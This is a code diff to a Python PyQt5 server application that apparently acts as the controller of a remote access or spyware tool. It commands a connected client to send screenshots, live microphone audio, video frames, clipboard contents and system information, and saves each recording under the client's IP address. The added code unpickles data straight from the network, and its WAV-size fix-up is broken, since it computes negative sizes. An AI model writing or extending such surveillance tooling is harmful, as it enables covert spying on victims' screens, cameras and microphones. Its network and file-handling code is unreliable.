@@ -11,21 +11,27 @@ import uuid
 import os
 import json
 import threading
+import pyaudio
 from PyQt5.QtWidgets import QApplication
 from PyQt5.QtWidgets import (QLineEdit, QWidget, 
-                             QPushButton, QToolTip, 
+                             QPushButton,
                              QLabel, QVBoxLayout, 
                              QMessageBox, QTextEdit,
                              QScrollBar, QDialog,
                              QTableWidget, QTableWidgetItem, 
                              QHeaderView, QFileDialog, QListWidget,
                              QProgressBar)
-from PyQt5.QtGui import QFont, QIcon
+from PyQt5.QtGui import QIcon
 from PyQt5.QtCore import pyqtSignal, QObject, QThread, pyqtSlot
 from connection_module import SecureConnectionServer
 
 start_port, end_port = 50000, 50100
 PORT_RANGE = {port: False for port in range(start_port, end_port + 1)}
+
+CHUNK = 1024  
+FORMAT = pyaudio.paInt16
+CHANNELS = 2
+RATE = 44100
 
 logging.basicConfig(level=logging.DEBUG,
                     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -551,11 +557,52 @@ class Server(QWidget):
         self.show_info_popup(clipboard_data_json)
 
     def screenshot_capture(self):
-        pass
+        self.connection.send_data_AES(b"SCC")
+        raw_data = self.connection.receive_data_AES()
+        img_np = np.frombuffer(raw_data, dtype=np.uint8).reshape((720, 1280, 3))
+        cv2.imshow('Screenshot', img_np)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"screenshot_{self.connected_ip}_{timestamp}.png"
+        cv2.imwrite(filename, img_np)
 
     def audio_capture(self):
-        pass
-
+        self.connection.send_data_AES(b"AC")
+        audio = pyaudio.PyAudio()
+        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"audio_{self.connected_ip}_{timestamp}.wav"
+        wf = open(filename, 'wb')
+    
+        wf.write(b'RIFF')
+        wf.write((0).to_bytes(4, 'little'))  
+        wf.write(b'WAVE')
+        wf.write(b'fmt ')
+        wf.write((16).to_bytes(4, 'little'))  
+        wf.write((1).to_bytes(2, 'little'))
+        wf.write((CHANNELS).to_bytes(2, 'little')) 
+        wf.write((RATE).to_bytes(4, 'little'))  
+        wf.write((RATE * CHANNELS * 2).to_bytes(4, 'little'))
+        wf.write((CHANNELS * 2).to_bytes(2, 'little'))  
+        wf.write((16).to_bytes(2, 'little')) 
+        wf.write(b'data')
+        wf.write((0).to_bytes(4, 'little'))
+        
+        try:
+            while True:
+                data = self.connection.receive_data_AES()
+                if not data:
+                    break
+                stream.write(data)
+                wf.write(data)
+        finally:
+            wf.seek(4)
+            file_size = wf.tell() - 8
+            wf.write(file_size.to_bytes(4, 'little'))
+            
+            wf.seek(40)
+            data_size = wf.tell() - 44
+            wf.write(data_size.to_bytes(4, 'little')) 
+    
     def gather_system_info(self):
         try:
             self.connection.send_data_AES(b"SI")
@@ -582,32 +629,13 @@ class Server(QWidget):
             self.show_error_message(f"{str(e)}")
 
     def video_capture(self):
-        if not self.is_connected:
-            self.show_error_message(f"You are not connected to any client")
-            return
-        try:
-            self.connection.send_data_AES(b"B")
-            data = b''
-            size = struct.calcsize("L")
-            while True:
-                self.connection.send_data_AES(b"continue")
-                while len(data) < size:
-                    data += self.connection.receive_data_AES()
-                packed_msg_size = data[:size]
-                data = data[size:]
-                msg_size = struct.unpack("L", packed_msg_size)[0]
-                while len(data) < msg_size:
-                    data += self.connection.receive_data_AES()
-                frame_data = data[:msg_size]
-                data = data[msg_size:]
-                frame = pickle.loads(frame_data)
-                cv2.imshow('frame', frame)
-                if cv2.waitKey(1) & 0xFF == ord('x') or 0xFF == ord("ч"):
-                    self.connection.send(b"stop")
-                    break
-            cv2.destroyAllWindows()
-        except Exception as e:
-            self.show_error_message(f"{str(e)}")
+        self.connection.send_data_AES(b"VC")
+        while True:
+            data = self.connection.receive_data_AES()
+            frame = pickle.loads(data)
+            cv2.imshow('Received Video', frame)
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                break
 
     def screen_capture(self):
         if not self.is_connected:
